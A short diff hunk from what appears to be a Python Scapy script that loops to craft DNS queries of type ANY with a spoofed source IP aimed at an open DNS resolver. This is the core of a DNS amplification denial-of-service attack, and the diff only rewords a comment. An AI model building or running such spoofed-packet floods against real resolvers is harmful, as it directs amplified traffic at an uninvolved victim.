@@ -32,7 +32,7 @@ spoofed_ip = "10.244.8.187"
 for _ in range(dns_query_packets):
     qname = random.choice(qnames)
 
-    # Create the DNS packet with a random source IP address and random domain name
+    # Create the DNS packet with a spoofed source IP address and random domain name
     dns_query = IP(src=spoofed_ip, dst=open_dns_resolver) / UDP(sport=RandShort(), dport=53) / \
                 DNS(rd=1, qd=DNSQR(qname=qname, qtype="ANY"))
 
